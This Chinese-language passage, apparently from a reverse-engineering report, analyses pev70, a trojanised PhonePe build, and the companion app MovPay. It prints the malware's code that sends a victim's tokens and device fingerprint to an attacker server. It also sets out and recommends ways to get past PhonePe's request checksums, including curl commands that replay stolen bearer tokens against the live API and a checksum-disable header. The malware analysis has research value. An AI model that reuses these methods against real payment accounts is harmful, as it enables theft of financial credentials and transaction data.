3. **同时验证请求和响应** — 通过 `X-RESPONSE-TOKEN` 验证响应完整性

**这意味着：如果修改 URL 中的 `fromTimestamp`，校验和会不匹配，请求将被拒绝！**

### 14.4 为什么简单修改 URL 参数无效

如果在拦截器中直接修改 `fromTimestamp=0`：

```java
// 这种方法会失败！
String newUrl = url.replaceAll("fromTimestamp=\\d+", "fromTimestamp=0");
Request newRequest = request.newBuilder().url(newUrl).build();
```

**后果**：
1. URL 被修改
2. 但 `X-REQUEST-CHECKSUM-V4` 仍然是基于**原始 URL** 计算的
3. 服务器验证校验和失败
4. 请求被拒绝或返回错误

### 14.5 绕过校验和的可行方案

#### 方案 A：理解并重新计算校验和（极高难度）

已找到校验和生成逻辑（`c.java:176`），但实际计算在 Native 层：

```java
// 调用链
ChecksumInterceptor.h()
  → EncryptionUtils.jnmcs(context, path, body, uuid, context)
    → JNI 调用到 native 库
```

**逆向难度**：
- 需要逆向 Native 库（可能是 `libcheckmate.so` 或类似）
- 需要理解加密算法和密钥派生
- 服务端会验证，不能随意伪造

**结论：除非有专门的 Native 逆向能力，否则不推荐此方案。**

#### 方案 B：在校验和生成之前修改参数（推荐）

通过 Hook PhonePe 的同步管理器，在请求构建之前修改参数：

1. Hook `BaseTransactionSyncManager` 的同步触发方法
2. 在参数被传入 API 调用之前将 `fromTimestamp` 设为 0
3. 让 PhonePe 自己用修改后的参数生成正确的校验和

**这种方法利用了应用自身的校验和生成逻辑**。

#### 方案 C：清除本地同步状态强制初始同步

```bash
# 清除应用数据（需重新登录）
adb shell pm clear com.phonepe.app

# 或只清除数据库（需 root）
adb shell "su -c 'rm -rf /data/data/com.phonepe.app/databases/core_database*'"
```

重新登录后，应用会执行初始同步（`fromTimestamp=0`），此时可以捕获完整交易历史。

#### 方案 D：使用凭证在服务端调用（pev70 的方法）

这是最可靠的方法，也是 pev70 恶意软件采用的策略：

1. 不在客户端修改请求
2. 通过 `getRequestMeta()` 窃取完整凭证
3. 在自己的服务器上构造新请求
4. 测试服务器是否强制验证校验和

**测试步骤**：

```bash
# 步骤 1: 先测试不带校验和是否可行
curl -X POST "https://apicp1.phonepe.com/apis/tstore/v2/units/changes\
?viewVersion=54&viewId=phonepeApp__APPView&size=100&metaId=<stolen_metaId>\
&fromTimestamp=0&sortOrder=DESC" \
  -H "Authorization: Bearer <stolen_token>" \
  -H "X-Device-Fingerprint: <stolen_fingerprint>" \
  -H "X-APP-ID: <stolen_app_id>"
  # 不带 X-REQUEST-CHECKSUM-V4

# 步骤 2: 如果失败，尝试使用 should_disable_checksum 头
# （这个头在代码中被检查，可能是调试开关）
curl -X POST "..." \
  -H "should_disable_checksum: true" \
  -H "Authorization: Bearer <stolen_token>" \
  ...
```

**代码发现**：`ChecksumInterceptor` 第 92-98 行有一个绕过机制：

```java
String header = chain.request().header("should_disable_checksum");
if (header != null && Boolean.parseBoolean(header)) {
    // 跳过校验和验证！
    return chain.proceed(builderNewBuilder.build());
}
```

**注意**：这个头可能只在客户端生效，服务端可能仍然验证。需要实际测试确认。

### 14.6 结论与建议

| 方法 | 可行性 | 复杂度 | 推荐 |
|------|--------|--------|------|
| 修改 `X-REQUEST-START-TIME` | ❌ 无效 | - | ❌ |
| 拦截器修改 URL | ❌ 校验和失败 | 低 | ❌ |
| 逆向校验和算法 | ⚠️ 可能可行 | 高 | ⚠️ |
| Hook 同步管理器 | ✅ 可行 | 中 | ✅ |
| 清除数据重新登录 | ✅ 可行 | 低 | ✅ |
| 服务端 API 调用 | ✅ 最可靠 | 中 | ✅ |

**对于安全研究，推荐先尝试"清除数据重新登录"方案**，然后在初始同步时捕获完整交易记录。如果需要持续获取，则使用凭证在服务端调用。

---

## 15. MovPay 如何使用窃取的凭证（重要发现）

### 15.1 核心发现：校验和在服务端计算，不在 MovPay 客户端

通过分析 MovPay 和 pev70 的代码，发现：

**MovPay 本身不实现 PhonePe 的校验和逻辑！**

数据流如下：

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  pev70 (注入的 PhonePe)                                                       │
│                                                                              │
│  1. PhonePeInterceptor 拦截 Token 刷新请求                                    │
│     └─ /apis/users/org/auth/oauth/v1/token/refresh                           │
│     └─ /apis/users/v1/tokenrefresh/                                          │
│                                                                              │
│  2. 调用 PhonePeHelper.getRequestMetaInfoObj() 收集凭证                       │
│     └─ 1FA Token, Auth Token, 设备指纹, Headers 等                            │
│                                                                              │
│  3. 调用 Syncclient.syncMeta() 发送到服务端                                   │
│     └─ syncMeta("phonepe", "get", requestMetaInfoObj.toString(), tokenUrl)   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
                           │
                           │ Go-based Native Library (syncclient)
                           │ WebSocket/gRPC 连接
                           ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  攻击者服务端                                                                  │
│                                                                              │
│  1. 接收完整凭证 (RequestMetaInfo JSON)                                       │
│     └─ token, refreshToken, deviceFingerprint, headers...                    │
│                                                                              │
│  2. 使用凭证直接调用 PhonePe API                                              │
│     └─ POST https://apicp1.phonepe.com/apis/tstore/v2/units/changes          │
│     └─ Authorization: Bearer <stolen_token>                                  │
│     └─ X-Device-Fingerprint: <stolen_fingerprint>                            │
│     └─ 其他必要 Headers...                                                    │
│                                                                              │
│  3. 校验和处理：                                                              │
│     ├─ 方案 A: 服务端可能不需要校验和 (PhonePe 服务端可能只验证 Token)         │
│     ├─ 方案 B: 服务端实现了校验和算法 (逆向 Native 代码后重新实现)            │
│     └─ 方案 C: 通过其他方式绕过 (例如使用老版本 API)                          │
│                                                                              │
│  4. 返回交易历史数据给 pev70 或 MovPay                                        │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 15.2 证据：Syncclient 是 Go 原生库

**文件位置**：`pev70_jadx/sources/syncclient/Syncclient.java`

```java
public abstract class Syncclient {
    // Go 原生方法
    public static native String syncMeta(String appType, String action,
                                         String metaJson, String tokenUrl) throws Exception;

    public static native void initGlobalTokenSyncClient(String serverUrl, ...) throws Exception;

    static {
        Seq.touch();  // gomobile 生成的代码特征
        Zlog.touch();
        _init();
    }
}
```

这表明 `Syncclient` 是用 **Go 语言编写**，通过 gomobile 生成的 JNI 绑定。

### 15.3 证据：pev70 直接发送凭证到服务端

**文件位置**：`pev70_jadx/sources/com/PhonePeTweak/Def/PhonePeInterceptor.java:177-182`

```java
// 当检测到 Token 刷新请求时
if (request.url().encodedPath().contains("/apis/users/org/auth/oauth/v1/token/refresh")) {
    JSONObject requestMetaInfoObj = PhonePeHelper.getRequestMetaInfoObj();
    if (requestMetaInfoObj != null) {
        // 直接发送完整凭证到服务端！
        String response = Syncclient.syncMeta("phonepe", "get",
                                               requestMetaInfoObj.toString(),
                                               PhonePeHelper.GetTokenURL());
        // 服务端可能返回新的 Token 或交易数据
    }
}
```

### 15.4 MovPay 的角色

MovPay **不直接调用 PhonePe API**。它的作用是：

1. **绑定 AIDL 服务** - 与 pev70 建立跨进程通信
2. **接收事件回调** - 通过 `IPayBack.onEvent()` 接收 pev70 的通知
3. **日志上报** - 将事件通过 `y.q()` 记录到 SQLite，然后上传到 `log.financeforge.win`
4. **获取 UPI 列表** - 调用 `getUPIList()` 获取账户信息（pev70 有实现）
5. **获取交易列表** - 调用 `getPayList()` **但 pev70 返回空字符串**

**关键代码**（`mov4.5.3_jadx/.../exoplayer/audio/h.java:56-59`）：

```java
if ("phonepe".equals(str)) {
    IPayService iPayService = (IPayService) map.get(str);
    sb.append(iPayService.getPayList(0, 10));  // 返回空字符串！
}
```

### 15.5 结论

1. **校验和不在 MovPay 中实现** - MovPay 只是一个协调器/UI
2. **pev70 直接与服务端通信** - 通过 `Syncclient` (Go Native) 发送凭证
3. **服务端负责 API 调用** - 攻击者服务端使用窃取的凭证调用 PhonePe API
4. **服务端可能已解决校验和问题** - 或者 PhonePe 服务端对某些请求不强制验证校验和

### 15.6 对安全研究的启示

如果想复现服务端调用 PhonePe API：

1. **捕获完整的 RequestMetaInfo** - 通过 `getRequestMeta()` 或直接从 log_server
2. **测试是否需要校验和** - 尝试不带校验和直接调用，看服务端是否拒绝
3. **分析 syncclient 协议** - 如果需要深入，可以逆向 Go Native 库

```bash
# 捕获 RequestMetaInfo 示例
adb logcat -s HttpInterceptor | grep -i "RequestMetaInfo"

# 或者从 log_server 获取
curl "http://localhost:8088/api/logs?limit=100" | \
  jq '.data[] | select(.url | contains("tokenrefresh")) | .requestHeaders'
```
